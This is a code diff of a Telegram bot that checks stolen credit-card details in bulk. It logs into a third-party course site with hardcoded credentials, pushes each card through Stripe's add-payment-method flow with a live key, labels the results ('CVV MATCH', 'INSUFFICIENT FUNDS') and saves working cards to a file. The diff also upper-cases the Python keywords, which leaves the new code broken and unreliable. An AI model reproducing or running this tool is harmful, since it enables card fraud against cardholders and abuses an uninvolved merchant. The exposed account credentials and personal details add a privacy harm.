@@ -15,43 +15,46 @@ from telegram.ext import (
     ContextTypes,
 )
 
+# GANTI DENGAN CHAT ID ANDA SENDIRI
+ADMIN_CHAT_ID = 7519839885
+
 # Helper function to extract substring between start and end
-def gets(s: str, start: str, end: str) -> str | None:
-    try:
-        start_index = s.index(start) + len(start)
-        end_index = s.index(end, start_index)
-        return s[start_index:end_index]
-    except ValueError:
-        return None
+DEF GETS(S: str, START: str, END: str) -> str | None:
+    TRY:
+        START_INDEX = S.INDEX(START) + LEN(START)
+        END_INDEX = S.INDEX(END, START_INDEX)
+        RETURN S[START_INDEX:END_INDEX]
+    EXCEPT ValueError:
+        RETURN None
 
 # Create payment method with expiry validation
-async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
-    try:
-        cc, mes, ano, cvv = fullz.split("|")
+ASYNC DEF CREATE_PAYMENT_METHOD(FULLZ: str, SESSION: httpx.AsyncClient) -> str:
+    TRY:
+        CC, MES, ANO, CVV = FULLZ.SPLIT("|")
 
         # Validate expiration date
-        mes = mes.zfill(2)
-        if len(ano) == 4:
-            ano = ano[-2:]
+        MES = MES.ZFILL(2)
+        IF LEN(ANO) == 4:
+            ANO = ANO[-2:]
 
-        current_year = int(time.strftime("%y"))
-        current_month = int(time.strftime("%m"))
+        CURRENT_YEAR = INT(TIME.STRFtime("%y"))
+        CURRENT_MONTH = INT(TIME.STRFtime("%m"))
 
-        try:
-            expiry_month = int(mes)
-            expiry_year = int(ano)
-        except ValueError:
-            return json.dumps({"error": {"message": "Invalid expiry date"}})
+        TRY:
+            EXPIRY_MONTH = INT(MES)
+            EXPIRY_YEAR = INT(ANO)
+        EXCEPT ValueError:
+            RETURN JSON.DUMPS({"error": {"message": "Invalid expiry date"}})
 
-        if expiry_month < 1 or expiry_month > 12:
-            return json.dumps({"error": {"message": "Expiration Month Invalid"}})
-        if expiry_year < current_year:
-            return json.dumps({"error": {"message": "Expiration Year Invalid"}})
-        if expiry_year == current_year and expiry_month < current_month:
-            return json.dumps({"error": {"message": "Expiration Month Invalid"}})
+        IF EXPIRY_MONTH < 1 OR EXPIRY_MONTH > 12:
+            RETURN JSON.DUMPS({"error": {"message": "Expiration Month Invalid"}})
+        IF EXPIRY_YEAR < CURRENT_YEAR:
+            RETURN JSON.DUMPS({"error": {"message": "Expiration Year Invalid"}})
+        IF EXPIRY_YEAR == CURRENT_YEAR AND EXPIRY_MONTH < CURRENT_MONTH:
+            RETURN JSON.DUMPS({"error": {"message": "Expiration Month Invalid"}})
 
         # Request headers etc.
-        headers1 = {
+        HEADERS1 = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
             'Cache-Control': 'max-age=0',
@@ -69,21 +72,21 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         }
 
         # Get login token
-        response = await session.get('https://elearntsg.com/login/', headers=headers1)
-        login_token = gets(response.text, '"learndash-login-form" value="', '" />')
-        if not login_token:
-            return json.dumps({"error": {"message": "Failed to get login token"}})
+        RESPONSE = AWAIT SESSION.GET('https://elearntsg.com/login/', HEADERS=HEADERS1)
+        LOGIN_TOKEN = GETS(RESPONSE.TEXT, '"learndash-login-form" value="', '" />')
+        IF NOT LOGIN_TOKEN:
+            RETURN JSON.DUMPS({"error": {"message": "Failed to get login token"}})
 
         # Login data
-        headers2 = headers1.copy()
-        headers2.update({
+        HEADERS2 = HEADERS1.COPY()
+        HEADERS2.UPDATE({
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://elearntsg.com',
             'Referer': 'https://elearntsg.com/login/',
         })
 
-        data_login = {
-            'learndash-login-form': login_token,
+        DATA_LOGIN = {
+            'learndash-login-form': LOGIN_TOKEN,
             'pmpro_login_form_used': '1',
             'log': 'ayasayamaguchi12@signinid.com',   # Ganti akun login sesuai kamu
             'pwd': 'Ayasa1209',               # Ganti password sesuai kamu
@@ -91,20 +94,20 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'redirect_to': '',
         }
 
-        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers2, data=data_login)
+        RESPONSE = AWAIT SESSION.POST('https://elearntsg.com/wp-login.php', HEADERS=HEADERS2, DATA=DATA_LOGIN)
 
-        for url in [
+        FOR URL IN [
             'https://elearntsg.com/activity-feed/',
             'https://elearntsg.com/my-account/payment-methods/',
             'https://elearntsg.com/my-account/add-payment-method/'
         ]:
-            response = await session.get(url, headers=headers1)
+            RESPONSE = AWAIT SESSION.GET(URL, HEADERS=HEADERS1)
 
-        nonce = gets(response.text, '"add_card_nonce":"', '"')
-        if not nonce:
-            return json.dumps({"error": {"message": "Failed to get add_card_nonce"}})
+        NONCE = GETS(RESPONSE.TEXT, '"add_card_nonce":"', '"')
+        IF NOT NONCE:
+            RETURN JSON.DUMPS({"error": {"message": "Failed to get add_card_nonce"}})
 
-        headers_stripe = {
+        HEADERS_STRIPE = {
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
@@ -120,14 +123,14 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        data_stripe = {
+        DATA_STRIPE = {
             'type':'card',
             'billing_details[name]':'parael senoman',
             'billing_details[email]':'parael10@gmail.com',
-            'card[number]': cc,
-            'card[cvc]': cvv,
-            'card[exp_month]': mes,
-            'card[exp_year]': ano,
+            'card[number]': CC,
+            'card[cvc]': CVV,
+            'card[exp_month]': MES,
+            'card[exp_year]': ANO,
             'guid':'6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
             'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
             'sid':'6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
@@ -141,13 +144,13 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
         }
 
-        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
-        try:
-            id = response.json()['id']
-        except Exception:
-            return response.text
+        RESPONSE = AWAIT SESSION.POST('https://api.stripe.com/v1/payment_methods', HEADERS=HEADERS_STRIPE, DATA=DATA_STRIPE)
+        TRY:
+            ID = RESPONSE.JSON()['id']
+        EXCEPT Exception:
+            RETURN RESPONSE.TEXT
 
-        headers_ajax = {
+        HEADERS_AJAX = {
             'Accept': 'application/json, text/javascript, */*; q=0.01',
             'Accept-Language': 'en-US,en;q=0.9',
             'Connection': 'keep-alive',
@@ -164,222 +167,229 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'sec-ch-ua-platform': '"Linux"',
         }
 
-        params = {
+        PARAMS = {
             'wc-ajax': 'wc_stripe_create_setup_intent',
         }
 
-        data_ajax = {
-            'stripe_source_id': id,
-            'nonce': nonce,
+        DATA_AJAX = {
+            'stripe_source_id': ID,
+            'nonce': NONCE,
         }
 
-        response = await session.post('https://elearntsg.com/', params=params, headers=headers_ajax, data=data_ajax)
+        RESPONSE = AWAIT SESSION.POST('https://elearntsg.com/', PARAMS=PARAMS, HEADERS=HEADERS_AJAX, DATA=DATA_AJAX)
 
-        return response.text
+        RETURN RESPONSE.TEXT
 
-    except Exception as e:
-        return f"Exception: {str(e)}"
+    EXCEPT Exception AS E:
+        RETURN F"Exception: {STR(E)}"
 
 # Function maps API response text to friendly message
-async def charge_resp(result):
-    try:
-        if (
-            '{"status":"SUCCESS",' in result or
-            '"status":"success"' in result
+ASYNC DEF CHARGE_RESP(RESULT):
+    TRY:
+        IF (
+            '{"status":"SUCCESS",' IN RESULT OR
+            '"status":"success"' IN RESULT
         ):
-            response = "Payment method successfully added ✅"
-        elif "Thank you for your donation" in result:
-            response = "Payment successful! 🎉"
-        elif "insufficient funds" in result or "card has insufficient funds." in result:
-            response = "INSUFFICIENT FUNDS ✅"
-        elif "Your card has insufficient funds." in result:
-            response = "INSUFFICIENT FUNDS ✅"
-        elif (
-            "incorrect_cvc" in result
-            or "security code is incorrect." in result
-            or "Your card's security code is incorrect." in result
+            RESPONSE = "Payment method successfully added ✅"
+        ELIF "Thank you for your donation" IN RESULT:
+            RESPONSE = "Payment successful! 🎉"
+        ELIF "insufficient funds" IN RESULT OR "card has insufficient funds." IN RESULT:
+            RESPONSE = "INSUFFICIENT FUNDS ✅"
+        ELIF "Your card has insufficient funds." IN RESULT:
+            RESPONSE = "INSUFFICIENT FUNDS ✅"
+        ELIF (
+            "incorrect_cvc" IN RESULT
+            OR "security code is incorrect." IN RESULT
+            OR "Your card's security code is incorrect." IN RESULT
         ):
-            response = "CVV INCORRECT ❎"
-        elif "transaction_not_allowed" in result:
-            response = "TRANSACTION NOT ALLOWED ❎"
-        elif '"cvc_check": "pass"' in result:
-            response = "CVV MATCH ✅"
-        elif "requires_action" in result:
-            response = "VERIFICATION 🚫"
-        elif (
-            "three_d_secure_redirect" in result
-            or "card_error_authentication_required" in result
-            or "wcpay-confirm-pi:" in result
+            RESPONSE = "CVV INCORRECT ❎"
+        ELIF "transaction_not_allowed" IN RESULT:
+            RESPONSE = "TRANSACTION NOT ALLOWED ❎"
+        ELIF '"cvc_check": "pass"' IN RESULT:
+            RESPONSE = "CVV MATCH ✅"
+        ELIF "requires_action" IN RESULT:
+            RESPONSE = "VERIFICATION 🚫"
+        ELIF (
+            "three_d_secure_redirect" IN RESULT
+            OR "card_error_authentication_required" IN RESULT
+            OR "wcpay-confirm-pi:" IN RESULT
         ):
-            response = "3DS Required ❎"
-        elif "stripe_3ds2_fingerprint" in result:
-            response = "3DS Required ❎"
-        elif "Your card does not support this type of purchase." in result:
-            response = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
-        elif (
-            "generic_decline" in result
-            or "You have exceeded the maximum number of declines on this card in the last 24 hour period."
-            in result
-            or "card_decline_rate_limit_exceeded" in result
-            or "This transaction cannot be processed." in result
-            or '"status":400,' in result
+            RESPONSE = "3DS Required ❎"
+        ELIF "stripe_3ds2_fingerprint" IN RESULT:
+            RESPONSE = "3DS Required ❎"
+        ELIF "Your card does not support this type of purchase." IN RESULT:
+            RESPONSE = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
+        ELIF (
+            "generic_decline" IN RESULT
+            OR "You have exceeded the maximum number of declines on this card in the last 24 hour period."
+            IN RESULT
+            OR "card_decline_rate_limit_exceeded" IN RESULT
+            OR "This transaction cannot be processed." IN RESULT
+            OR '"status":400,' IN RESULT
         ):
-            response = "GENERIC DECLINED ❌"
-        elif "do not honor" in result:
-            response = "DO NOT HONOR ❌"
-        elif "Suspicious activity detected. Try again in a few minutes." in result:
-            response = "TRY AGAIN IN A FEW MINUTES ❌"
-        elif "fraudulent" in result:
-            response = "FRAUDULENT ❌ "
-        elif "setup_intent_authentication_failure" in result:
-            response = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
-        elif "invalid cvc" in result:
-            response = "INVALID CVV ❌"
-        elif "stolen card" in result:
-            response = "STOLEN CARD ❌"
-        elif "lost_card" in result:
-            response = "LOST CARD ❌"
-        elif "pickup_card" in result:
-            response = "PICKUP CARD ❌"
-        elif "incorrect_number" in result:
-            response = "INCORRECT CARD NUMBER ❌"
-        elif "Your card has expired." in result or "expired_card" in result:
-            response = "EXPIRED CARD ❌"
-        elif "intent_confirmation_challenge" in result:
-            response = "CAPTCHA ❌"
-        elif "Your card number is incorrect." in result:
-            response = "INCORRECT CARD NUMBER ❌"
-        elif (
-            "Your card's expiration year is invalid." in result
-            or "Your card's expiration year is invalid." in result
+            RESPONSE = "GENERIC DECLINED ❌"
+        ELIF "do not honor" IN RESULT:
+            RESPONSE = "DO NOT HONOR ❌"
+        ELIF "Suspicious activity detected. Try again in a few minutes." IN RESULT:
+            RESPONSE = "TRY AGAIN IN A FEW MINUTES ❌"
+        ELIF "fraudulent" IN RESULT:
+            RESPONSE = "FRAUDULENT ❌ "
+        ELIF "setup_intent_authentication_failure" IN RESULT:
+            RESPONSE = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
+        ELIF "invalid cvc" IN RESULT:
+            RESPONSE = "INVALID CVV ❌"
+        ELIF "stolen card" IN RESULT:
+            RESPONSE = "STOLEN CARD ❌"
+        ELIF "lost_card" IN RESULT:
+            RESPONSE = "LOST CARD ❌"
+        ELIF "pickup_card" IN RESULT:
+            RESPONSE = "PICKUP CARD ❌"
+        ELIF "incorrect_number" IN RESULT:
+            RESPONSE = "INCORRECT CARD NUMBER ❌"
+        ELIF "Your card has expired." IN RESULT OR "expired_card" IN RESULT:
+            RESPONSE = "EXPIRED CARD ❌"
+        ELIF "intent_confirmation_challenge" IN RESULT:
+            RESPONSE = "CAPTCHA ❌"
+        ELIF "Your card number is incorrect." IN RESULT:
+            RESPONSE = "INCORRECT CARD NUMBER ❌"
+        ELIF (
+            "Your card's expiration year is invalid." IN RESULT
+            OR "Your card's expiration year is invalid." IN RESULT
         ):
-            response = "EXPIRATION YEAR INVALID ❌"
-        elif (
-            "Your card's expiration month is invalid." in result
-            or "invalid_expiry_month" in result
+            RESPONSE = "EXPIRATION YEAR INVALID ❌"
+        ELIF (
+            "Your card's expiration month is invalid." IN RESULT
+            OR "invalid_expiry_month" IN RESULT
         ):
-            response = "EXPIRATION MONTH INVALID ❌"
-        elif "card is not supported." in result:
-            response = "CARD NOT SUPPORTED ❌"
-        elif "invalid account" in result:
-            response = "DEAD CARD ❌"
-        elif (
-            "Invalid API Key provided" in result
-            or "testmode_charges_only" in result
-            or "api_key_expired" in result
-            or "Your account cannot currently make live charges." in result
+            RESPONSE = "EXPIRATION MONTH INVALID ❌"
+        ELIF "card is not supported." IN RESULT:
+            RESPONSE = "CARD NOT SUPPORTED ❌"
+        ELIF "invalid account" IN RESULT:
+            RESPONSE = "DEAD CARD ❌"
+        ELIF (
+            "Invalid API Key provided" IN RESULT
+            OR "testmode_charges_only" IN RESULT
+            OR "api_key_expired" IN RESULT
+            OR "Your account cannot currently make live charges." IN RESULT
         ):
-            response = "stripe error contact support@stripe.com for more details ❌"
-        elif "Your card was declined." in result or "card was declined" in result:
-            response = "CARD DECLINED ❌"
-        elif "card number is incorrect." in result:
-            response = "CARD NUMBER INCORRECT ❌"
-        elif "Sorry, we are unable to process your payment at this time. Please retry later." in result:
-            response = "Sorry, we are unable to process your payment at this time. Please retry later ⏳"
-        elif "card number is incomplete." in result:
-            response = "CARD NUMBER INCOMPLETE ❌"
-        elif "The order total is too high for this payment method" in result:
-            response = "ORDER TO HIGH FOR THIS CARD ❌"
-        elif "The order total is too low for this payment method" in result:
-            response = "ORDER TO LOW FOR THIS CARD ❌"
-        elif "Please Update Bearer Token" in result:
-            response = "Token Expired Admin Has Been Notified ❌"
-        else:
-            response = result + "❌"
-            with open("result_logs.txt", "a", encoding="utf-8") as f:
-                f.write(f"{result}\n")
+            RESPONSE = "stripe error contact support@stripe.com for more details ❌"
+        ELIF "Your card was declined." IN RESULT OR "card was declined" IN RESULT:
+            RESPONSE = "CARD DECLINED ❌"
+        ELIF "card number is incorrect." IN RESULT:
+            RESPONSE = "CARD NUMBER INCORRECT ❌"
+        ELIF "Sorry, we are unable to process your payment at this time. Please retry later." IN RESULT:
+            RESPONSE = "Sorry, we are unable to process your payment at this time. Please retry later ⏳"
+        ELIF "card number is incomplete." IN RESULT:
+            RESPONSE = "CARD NUMBER INCOMPLETE ❌"
+        ELIF "The order total is too high for this payment method" IN RESULT:
+            RESPONSE = "ORDER TO HIGH FOR THIS CARD ❌"
+        ELIF "The order total is too low for this payment method" IN RESULT:
+            RESPONSE = "ORDER TO LOW FOR THIS CARD ❌"
+        ELIF "Please Update Bearer Token" IN RESULT:
+            RESPONSE = "Token Expired Admin Has Been Notified ❌"
+        ELSE:
+            RESPONSE = RESULT + "❌"
+            WITH OPEN("result_logs.txt", "a", encoding="utf-8") AS F:
+                F.WRITE(F"{RESULT}\n")
 
-        return response
-    except Exception as e:
-        return f"{str(e)} ❌"
+        RETURN RESPONSE
+    EXCEPT Exception AS E:
+        RETURN F"{STR(E)} ❌"
 
 # Combines create_payment_method + charge_resp + measure time
-async def multi_checking(fullz: str) -> str:
-    start = time.time()
-    async with httpx.AsyncClient(timeout=40) as session:
-        result = await create_payment_method(fullz, session)
-        response = await charge_resp(result)
+ASYNC DEF MULTI_CHECKING(FULLZ: str) -> str:
+    START = TIME.TIME()
+    ASYNC WITH httpx.AsyncClient(timeout=40) AS SESSION:
+        RESULT = AWAIT CREATE_PAYMENT_METHOD(FULLZ, SESSION)
+        RESPONSE = AWAIT CHARGE_RESP(RESULT)
 
-    elapsed = round(time.time() - start, 2)
+    ELAPSED = ROUND(TIME.TIME() - START, 2)
 
-    error_message = ""
-    try:
-        json_resp = json.loads(result)
-        if "error" in json_resp:
-            error_message = unescape(json_resp["error"].get("message", "")).strip()
-    except Exception:
-        pass
+    ERROR_MESSAGE = ""
+    TRY:
+        JSON_RESP = JSON.LOADS(RESULT)
+        IF "error" IN JSON_RESP:
+            ERROR_MESSAGE = UNESCAPE(JSON_RESP["error"].GET("message", "")).STRIP()
+    EXCEPT Exception:
+        PASS
 
-    if error_message:
-        output = (
-            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
-            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
-            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
-            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
+    IF ERROR_MESSAGE:
+        OUTPUT = (
+            F"𝗖𝗮𝗿𝗱: » <code>{FULLZ}</code>\n"
+            F"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
+            F"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {ERROR_MESSAGE} ❌\n"
+            F"𝗧𝗶𝗺𝗲: » {ELAPSED}s"
         )
-    else:
-        output = (
-            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
-            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
-            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
-            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
+    ELSE:
+        OUTPUT = (
+            F"𝗖𝗮𝗿𝗱: » <code>{FULLZ}</code>\n"
+            F"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
+            F"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {RESPONSE}\n"
+            F"𝗧𝗶𝗺𝗲: » {ELAPSED}s"
         )
-        if any(key in response for key in ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
-            with open("auth.txt", "a", encoding="utf-8") as file:
-                file.write(output + "\n")
+        IF ANY(KEY IN RESPONSE FOR KEY IN ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
+            WITH OPEN("auth.txt", "a", encoding="utf-8") AS FILE:
+                FILE.WRITE(OUTPUT + "\n")
 
-    return output
+    RETURN OUTPUT
 
 # Telegram bot handlers
 
-TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")
+TELEGRAM_BOT_TOKEN = OS.GETENV("TOKEN")
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await update.message.reply_text(
+ASYNC DEF START_HANDLER(UPDATE: Update, CONTEXT: ContextTypes.DEFAULT_TYPE) -> None:
+    IF UPDATE.EFFECTIVE_CHAT.ID != ADMIN_CHAT_ID:
+        AWAIT UPDATE.MESSAGE.REPLY_TEXT("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
+        RETURN
+    AWAIT UPDATE.MESSAGE.REPLY_TEXT(
         "𝗣𝗔𝗥𝗔𝗘𝗟 𝗕𝗢𝗧\n"
         "SEND CARD IN FORMAT CC|MM|YY|CVV\n"
     )
 
-async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    text = update.message.text.strip()
-    lines = [line.strip() for line in text.splitlines() if line.strip()]
+ASYNC DEF HANDLE_CC_MESSAGE(UPDATE: Update, CONTEXT: ContextTypes.DEFAULT_TYPE) -> None:
+    IF UPDATE.EFFECTIVE_CHAT.ID != ADMIN_CHAT_ID:
+        AWAIT UPDATE.MESSAGE.REPLY_TEXT("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
+        RETURN
 
-    msg = await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')
+    TEXT = UPDATE.MESSAGE.TEXT.STRIP()
+    LINES = [LINE.STRIP() FOR LINE IN TEXT.SPLITLINES() IF LINE.STRIP()]
 
-    try:
-        for line in lines:
-            parts = line.split("|")
-            if len(parts) != 4:
-                await update.message.reply_text(
-                    f"WRONG FORMAT:\n<code>{line}</code>\nUSE FORMAT: CC|MM|YYYY|CVV",
-                    parse_mode='HTML'
+    MSG = AWAIT UPDATE.MESSAGE.REPLY_TEXT("PROCESSING YOUR CARD, PLEASE WAIT...", PARSE_MODE='HTML')
+
+    TRY:
+        FOR LINE IN LINES:
+            PARTS = LINE.SPLIT("|")
+            IF LEN(PARTS) != 4:
+                AWAIT UPDATE.MESSAGE.REPLY_TEXT(
+                    F"WRONG FORMAT:\n<code>{LINE}</code>\nUSE FORMAT: CC|MM|YYYY|CVV",
+                    PARSE_MODE='HTML'
                 )
-                continue
+                CONTINUE
 
-            cc_num, month, year, cvv = parts
-            if len(year) == 4:
-                year = year[-2:]
+            CC_NUM, MONTH, YEAR, CVV = PARTS
+            IF LEN(YEAR) == 4:
+                YEAR = YEAR[-2:]
 
-            cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
+            CC_FORMATTED = F"{CC_NUM}|{MONTH}|{YEAR}|{CVV}"
 
             # Optional sleep if you want to add delay (can be removed for speed)
-            await asyncio.sleep(3)
+            AWAIT ASYNCIO.SLEEP(3)
 
-            result = await multi_checking(cc_formatted)
-            await update.message.reply_text(result, parse_mode='HTML')
+            RESULT = AWAIT MULTI_CHECKING(CC_FORMATTED)
+            AWAIT UPDATE.MESSAGE.REPLY_TEXT(RESULT, PARSE_MODE='HTML')
 
-        await msg.delete()
-    except Exception as e:
-        await update.message.reply_text(f"ERROR: {str(e)}")
+        AWAIT MSG.DELETE()
+    EXCEPT Exception AS E:
+        AWAIT UPDATE.MESSAGE.REPLY_TEXT(F"ERROR: {STR(E)}")
 
-def main() -> None:
-    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+DEF MAIN() -> None:
+    APPLICATION = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))
+    APPLICATION.add_handler(CommandHandler("start", START_HANDLER))
+    APPLICATION.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), HANDLE_CC_MESSAGE))
 
-    print("PARAEL CHECKER BOT RUNNING...")
-    application.run_polling()
+    PRINT("PARAEL CHECKER BOT RUNNING...")
+    APPLICATION.run_polling()
 
-if __name__ == "__main__":
-    main()
+IF __name__ == "__main__":
+    MAIN()
